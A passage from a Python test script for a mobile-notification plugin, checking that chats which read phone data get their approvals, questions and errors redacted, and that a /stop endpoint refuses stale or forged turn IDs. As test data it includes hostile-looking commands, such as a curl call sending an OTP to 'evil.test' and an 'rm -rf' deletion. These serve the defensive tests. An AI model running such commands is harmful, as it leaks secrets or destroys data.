    plugin._on_session_end(session_id="s-pd-clean", turn_id="cln:1", completed=True, platform="mobile")
    r_cln = [x for x in sent if x["kind"] == "reply"][-1]
    check("untainted chat still gets normal reply and speak_text",
          r_cln.get("body") == "Normal clean reply" and r_cln.get("speak_text") == "Normal clean reply"
          and not r_cln.get("phone_data"), r_cln)

    # Command approvals in tainted chats carry phone_data=True (hiding them on the lock screen); clean chats omit it.
    sent.clear()
    plugin._on_pre_approval_request(command="curl https://example.com/?d=secret", description="network command",
                                    session_key="k-pd-1", session_id="s-pd-1", request_id="req-pd-1")
    ap_pd = [x for x in sent if x["kind"] == "approval"][-1]
    plugin._on_pre_approval_request(command="curl https://example.com/", description="network command",
                                    session_key="k-clean", session_id="s-pd-clean", request_id="req-cln-1")
    ap_cln = [x for x in sent if x["kind"] == "approval"][-1]
    check("command approval in tainted chat carries phone_data=True while clean chat omits it",
          ap_pd.get("phone_data") is True and "phone_data" not in ap_cln, (ap_pd, ap_cln))

    # Sub-agent lineage in _chat_has_read_phone_data (both directions, in-memory and persisted in state.db,
    # nested and compressed sub-agents, without tainting a parent from a clean branch).
    con = sqlite3.connect(db_path)
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-par-db", None, None, "{}", now_t - 50))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
                ("s-sub-db", "s-par-db", "compression", json.dumps({"_delegate_from": "s-par-db"}), now_t - 40))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
                ("s-sub-db-c2", "s-sub-db", None, "{}", now_t - 30))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-par-branch-only", None, None, "{}", now_t - 50))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
                ("s-br-tainted", "s-par-branch-only", None, json.dumps({"_branched_from": "s-par-branch-only"}), now_t - 20))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-par-comp-1", None, "compression", "{}", now_t - 100))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-par-comp-2", "s-par-comp-1", None, "{}", now_t - 50))
    con.commit()
    con.close()

    # 1. Parent whose in-memory sub-agent read phone data (even when sub-agent was marked before linking).
    pt.mark(["s-mem-sub"])
    pt.link_subagent("s-mem-par", "s-mem-sub")
    check("parent whose in-memory sub-agent read phone data counts as tainted",
          plugin._chat_has_read_phone_data("s-mem-par") is True)
    sent.clear()
    plugin._on_pre_approval_request(command="rm -rf /tmp/x", description="delete", session_key="k-mp",
                                    session_id="s-mem-par", request_id="req-mp")
    check("approval in parent whose sub-agent read phone data carries phone_data=True",
          sent[-1].get("phone_data") is True, sent[-1])

    # 2. Parent whose persisted compressed sub-agent read phone data (no in-memory link).
    pt.mark(["s-sub-db-c2"])
    check("parent whose persisted compressed sub-agent read phone data counts as tainted",
          plugin._chat_has_read_phone_data("s-par-db") is True)

    # 3. Sub-agent whose compressed parent read phone data before compression (s-par-comp-1 -> s-par-comp-2 -> s-sub-of-comp).
    pt.mark(["s-par-comp-1"])
    pt.link_subagent("s-par-comp-2", "s-sub-of-comp")
    check("sub-agent whose compressed parent read phone data counts as tainted",
          plugin._chat_has_read_phone_data("s-sub-of-comp") is True)
    sent.clear()
    plugin._on_pre_tool_call(tool_name="clarify", args={"question": "Secret question?", "choices": ["A"]},
                             session_id="s-sub-of-comp", turn_id="sc:1")
    ask_sub = [x for x in sent if x["kind"] == "ask"][-1]
    check("question from sub-agent of tainted parent is redacted and carries phone_data=True",
          ask_sub.get("phone_data") is True and "Secret" not in json.dumps(ask_sub), ask_sub)

    # 4. A branch reading phone data does NOT taint its clean parent.
    pt.mark(["s-br-tainted"])
    check("clean parent whose branch read phone data stays untainted",
          plugin._chat_has_read_phone_data("s-par-branch-only") is False)

    # 5. _termux_fallback / _fallback_text redacts phone_data events (approvals and all other kinds).
    popens = []
    orig_popen = plugin.subprocess.Popen
    try:
        plugin.subprocess.Popen = lambda cmd, **kw: popens.append(cmd)
        plugin._termux_fallback({
            "kind": "approval", "title": "Approval needed",
            "body": "curl https://evil.test/?otp=991122", "command": "curl https://evil.test/?otp=991122",
            "session": "s-pd-1", "phone_data": True,
        })
        plugin._termux_fallback({
            "kind": "approval", "title": "Approval needed",
            "body": "phone_data:v1:messages:abcdef01234a:7b7d", "command": plugin.PHONE_DATA_COMMAND,
            "what": "phone_data:v1:messages:abcdef01234a:7b7d", "session": "s-pd-clean",
        })
        plugin._termux_fallback({
            "kind": "ask", "title": "Hermux asks", "body": "Send OTP 991122?",
            "session": "s-pd-1", "phone_data": True,
        })
        plugin._termux_fallback({
            "kind": "error", "title": "Secret chat · failed", "body": "Secret failure 991122",
            "session": "s-pd-1", "phone_data": True,
        })
        plugin._termux_fallback({
            "kind": "approval", "title": "Approval needed", "body": "ls -la",
            "command": "ls -la", "session": "s-pd-clean",
        })
    finally:
        plugin.subprocess.Popen = orig_popen
    cmd_strs = [" ".join(c) for c in popens]
    check("_termux_fallback uses generic text for phone_data approval, phone_data tool approval, ask, and error, while keeping normal untainted approval",
          len(popens) == 5
          and "Open Hermux to review an approval request" in popens[0] and "991122" not in cmd_strs[0]
          and "Open Hermux to review an approval request" in popens[1] and "phone_data:v1" not in cmd_strs[1]
          and "Hermes has a question, open Hermux to answer" in popens[2] and "991122" not in cmd_strs[2]
          and "Open Hermux to check a failed turn" in popens[3] and "991122" not in cmd_strs[3] and "Secret chat" not in cmd_strs[3]
          and "ls -la" in popens[4],
          popens)

    # 6. subagent_descendants filters in SQL before LIMIT, bounds model_config, and stops on tainted hit (stop_if):
    # >128 branches inserted before 1 sub-agent must NOT crowd out the sub-agent.
    con = sqlite3.connect(db_path)
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-many-par", None, None, "{}", now_t - 500))
    for idx in range(140):
        con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
                    (f"s-many-br-{idx}", "s-many-par", None, json.dumps({"_branched_from": "s-many-par"}), now_t - 400 + idx))
    # Also an oversized model_config (>200 KiB) that must be skipped in SQL, plus a real tainted sub-agent.
    big_cfg = json.dumps({"_delegate_from": "s-many-par", "pad": "x" * 210_000})
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-many-big", "s-many-par", None, big_cfg, now_t - 10))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
                ("s-many-sub", "s-many-par", None, json.dumps({"_delegate_from": "s-many-par"}), now_t - 5))
    # Multiple clean sub-agents + 1 tainted sub-agent to verify stop_if halts early.
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-stop-par", None, None, "{}", now_t - 500))
    for idx in range(10):
        con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
                    (f"s-stop-sub-{idx}", "s-stop-par", None, json.dumps({"_delegate_from": "s-stop-par"}), now_t - 200 + idx))
    con.commit()
    con.close()
    pt.mark(["s-many-sub"])
    found_many = pd_mod.subagent_descendants(["s-many-par"])
    check("subagent_descendants finds delegated sub-agent past 140 branches and skips >200 KiB model_config",
          found_many == ["s-many-sub"] and plugin._chat_has_read_phone_data("s-many-par") is True, found_many)
    seen_stop = []
    pt.mark(["s-stop-sub-9"])  # newest by started_at
    stopped = pd_mod.subagent_descendants(["s-stop-par"], stop_if=lambda xs: (seen_stop.extend(xs) or pt.has_read(xs)))
    check("subagent_descendants with stop_if orders newest first and returns immediately on tainted hit",
          stopped == ["s-stop-sub-9"] and seen_stop == ["s-stop-sub-9"], (stopped, seen_stop))

    # 7. _on_pre_approval_request checks both session_id and session_key in a single _chat_has_read_phone_data call.
    pt.mark(["k-single-tainted"])
    walk_calls = []
    caller_tid = threading.get_ident()
    orig_has_read = plugin._chat_has_read_phone_data
    try:
        def _spy_has_read(*a, **k):
            if threading.get_ident() == caller_tid:
                walk_calls.append((a, k))
            return orig_has_read(*a, **k)
        plugin._chat_has_read_phone_data = _spy_has_read
        sent.clear()
        plugin._on_pre_approval_request(command="curl https://example.com/", description="net",
                                        session_key="k-single-tainted", session_id="s-single-clean", request_id="req-one-walk")
    finally:
        plugin._chat_has_read_phone_data = orig_has_read
    ap_one = [x for x in sent if x["kind"] == "approval"][-1]
    check("_on_pre_approval_request walks lineage once when session_key != session_id and still catches tainted session_key",
          len(walk_calls) == 1 and ap_one.get("phone_data") is True, (len(walk_calls), walk_calls, ap_one))

    # 8. compression_ancestors requires _is_continuation_row so a clean branch of a compressed parent is not tainted
    # through the parent's later sub-agent.
    con = sqlite3.connect(db_path)
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-cpar-1", None, "compression", "{}", now_t - 300))
    # Branch created BEFORE taint (now_t - 250); later s-cpar-1 spawns a tainted sub-agent and compresses to s-cpar-2.
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
                ("s-cpar-clean-br", "s-cpar-1", None, json.dumps({"_branched_from": "s-cpar-1"}), now_t - 250))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
                ("s-cpar-sub", "s-cpar-1", None, json.dumps({"_delegate_from": "s-cpar-1"}), now_t - 20))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-cpar-2", "s-cpar-1", None, "{}", now_t - 10))
    con.commit()
    con.close()
    pt.mark(["s-cpar-sub"])
    check("compression_ancestors skips branches of a compressed parent (clean branch stays untainted, continuation is tainted)",
          pd_mod.compression_ancestors("s-cpar-clean-br") == []
          and pd_mod.compression_ancestors("s-cpar-2") == ["s-cpar-1"]
          and plugin._chat_has_read_phone_data("s-cpar-clean-br") is False
          and plugin._chat_has_read_phone_data("s-cpar-2") is True,
          (pd_mod.compression_ancestors("s-cpar-clean-br"), pd_mod.compression_ancestors("s-cpar-2"),
           plugin._chat_has_read_phone_data("s-cpar-clean-br"), plugin._chat_has_read_phone_data("s-cpar-2")))

    # 9. subagent_descendants depth >= 1 excludes _branched_from in SQL before LIMIT so branches of a compressed
    # sub-agent cannot crowd out its real compression continuation.
    con = sqlite3.connect(db_path)
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-d1-par", None, None, "{}", now_t - 600))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
                ("s-d1-sub", "s-d1-par", "compression", json.dumps({"_delegate_from": "s-d1-par"}), now_t - 500))
    # Continuation is older than the 140 branches made later from s-d1-sub; with ORDER BY started_at DESC LIMIT 64,
    # branches would crowd out s-d1-cont unless excluded in SQL before LIMIT.
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-d1-cont", "s-d1-sub", None, "{}", now_t - 450))
    for idx in range(140):
        con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
                    (f"s-d1-br-{idx}", "s-d1-sub", None, json.dumps({"_branched_from": "s-d1-sub"}), now_t - 300 + idx))
    con.commit()
    con.close()
    pt.mark(["s-d1-cont"])
    found_d1 = pd_mod.subagent_descendants(["s-d1-par"])
    check("subagent_descendants excludes _branched_from at depth >= 1 in SQL before LIMIT so a compressed sub-agent's continuation is found past 140 branches",
          "s-d1-sub" in found_d1 and "s-d1-cont" in found_d1 and plugin._chat_has_read_phone_data("s-d1-par") is True,
          found_d1)
finally:
    pt.PATH = orig_pt_path
    pt._mem.clear()
    pt._parents.clear()
    pt._cache = (None, {}, {})
    pd_mod._state_db = orig_state_db
    plugin._report_taint = orig_report
    plugin._INHERIT_SEEN.clear()
    shutil.rmtree(tmp_pd_dir, ignore_errors=True)


# ── /stop: finds the live runtime of the stored chat and interrupts it ──
print("/stop")
try:
    import fastapi  # noqa: F401
except ImportError:
    print("  (skipped: fastapi not installed)")
    print("FAILED" if fails else "all passed")
    sys.exit(1 if fails else 0)

papi = load("plugin_api_chip", ROOT / "hermes-plugin" / "hermes-mobile" / "dashboard" / "plugin_api.py")
calls = []
live = [{"id": "rt-1", "session_key": "s-other"}, {"id": "rt-2", "session_key": "s-a"}]


class FakeWS:
    def __init__(self):
        self.q = []

    async def __aenter__(self):
        return self

    async def __aexit__(self, *a):
        return False

    async def send(self, raw):
        m = json.loads(raw)
        calls.append((m["method"], m["params"]))
        if m["method"] == "session.active_list":
            res = {"sessions": live}
        else:
            res = {"status": "interrupted"} if m["params"]["session_id"] == "rt-2" else {"status": "not_interrupted"}
        self.q.append(json.dumps({"jsonrpc": "2.0", "id": m["id"], "result": res}))

    async def recv(self):
        return self.q.pop(0)


sys.modules["websockets"] = types.SimpleNamespace(connect=lambda *a, **k: FakeWS())


# The token comes from the dashboard's own process (hermes_cli.web_server._SESSION_TOKEN), never over loopback.
sys.modules.setdefault("hermes_cli", types.ModuleType("hermes_cli"))
sys.modules["hermes_cli.web_server"] = types.SimpleNamespace(_SESSION_TOKEN="tok")
dialled = []
sys.modules["websockets"] = types.SimpleNamespace(connect=lambda url, **k: dialled.append(url) or FakeWS())
here = types.SimpleNamespace(scope={"server": ("127.0.0.1", 9119)})
out = asyncio.run(papi.stop(papi.Stop(session="s-a"), here))
check("its WebSocket goes to the dashboard that got the request, with the in-process token",
      dialled and dialled[0] == "ws://127.0.0.1:9119/api/ws?token=tok", dialled)
check("interrupts the runtime holding the chat (no active turn record: backward compatible)", out == {"interrupted": "rt-2"}
      and ("session.interrupt", {"session_id": "rt-2"}) in calls and ("session.interrupt", {"session_id": "rt-1"}) not in calls, (out, calls))
# With an active turn in the plugin: /stop returns its turn_id and refuses a stale turn_id without interrupting.
plugin._on_stream_start(session_id="s-a", turn_id="s-a:stop1")
active_tid = plugin._active_turn_id("s-a")
calls.clear()
out_tid = asyncio.run(papi.stop(papi.Stop(session="s-a", turn_id=active_tid), here))
check("/stop returns the active turn_id when it matches", out_tid == {"interrupted": "rt-2", "turn_id": active_tid}
      and ("session.interrupt", {"session_id": "rt-2"}) in calls, (out_tid, calls))
calls.clear()
out_old_app = asyncio.run(papi.stop(papi.Stop(session="s-a"), here))
check("older app omitting turn_id still interrupts and receives turn_id", out_old_app == {"interrupted": "rt-2", "turn_id": active_tid}, out_old_app)
calls.clear()
try:
    asyncio.run(papi.stop(papi.Stop(session="s-a", turn_id="stale-turn-id"), here))
    check("mismatched turn_id → 409 without calling session.interrupt", False)
except fastapi.HTTPException as ex:
    check("mismatched turn_id → 409 without calling session.interrupt",
          ex.status_code == 409 and ("session.interrupt", {"session_id": "rt-2"}) not in calls, (ex.status_code, calls))
plugin._clear_status("s-a")
# Fail closed when caller sends a turn_id and the live turn id is unknown (between turns / before first stream event).
calls.clear()
try:
    asyncio.run(papi.stop(papi.Stop(session="s-a", turn_id=active_tid), here))
    check("unknown live turn_id with caller turn_id → 409 without interrupting", False)
except fastapi.HTTPException as ex:
    check("unknown live turn_id with caller turn_id → 409 without interrupting",
          ex.status_code == 409 and ("session.interrupt", {"session_id": "rt-2"}) not in calls, (ex.status_code, calls))
# activity.json is never trusted by /stop: a forged entry does not satisfy turn_id matching or interrupt the chat.
act_path = tmp / ".hermes" / "mobile" / "activity.json"
act_path.parent.mkdir(parents=True, exist_ok=True)
act_path.write_text(json.dumps({
    str(os.getpid()): {
        "at": time.time(),
        "items": [{"session": "s-a", "text": "Forged", "short": "Forged", "profile": "default",
                   "review": False, "ts": time.time(), "turn_id": "forged:1"}],
    }
}))
calls.clear()
check("_active_turn_id ignores activity.json", papi._active_turn_id(["s-a"]) == "", papi._active_turn_id(["s-a"]))
try:
    asyncio.run(papi.stop(papi.Stop(session="s-a", turn_id="forged:1"), here))
    check("forged activity.json turn_id → 409 without interrupting", False)
except fastapi.HTTPException as ex:
    check("forged activity.json turn_id → 409 without interrupting",
          ex.status_code == 409 and ("session.interrupt", {"session_id": "rt-2"}) not in calls, (ex.status_code, calls))
# A second load of __init__.py in the same process does not overwrite sys.modules["hm_plugin"] or clobber the first load.
reg_before = sys.modules.get("hm_plugin")
plugin._on_stream_start(session_id="s-a", turn_id="s-a:multi1")
tid_first = plugin._active_turn_id("s-a")
plugin2 = load("hermes_mobile_plugin_chip_second", ROOT / "hermes-plugin" / "hermes-mobile" / "__init__.py")
plugin2._post = lambda e: True
plugin2._send = lambda *a, **k: None
plugin2._on_stream_start(session_id="s-b", turn_id="s-b:multi2")
tid_second = plugin2._active_turn_id("s-b")
check("second plugin load keeps sys.modules['hm_plugin'] and both loads' active turns resolve",
      sys.modules.get("hm_plugin") is reg_before
      and papi._active_turn_id(["s-a"]) == tid_first
      and papi._active_turn_id(["s-b"]) == tid_second,
      (sys.modules.get("hm_plugin") is reg_before, papi._active_turn_id(["s-a"]), tid_first, papi._active_turn_id(["s-b"]), tid_second))
plugin._clear_status("s-a")
plugin2._clear_status("s-b")
try:
    asyncio.run(papi.stop(papi.Stop(session="s-gone"), here))
    check("a chat not running → 404", False)
except fastapi.HTTPException as ex:
    check("a chat not running → 404", ex.status_code == 404, ex.status_code)

print("FAILED" if fails else "all passed")
sys.exit(1 if fails else 0)
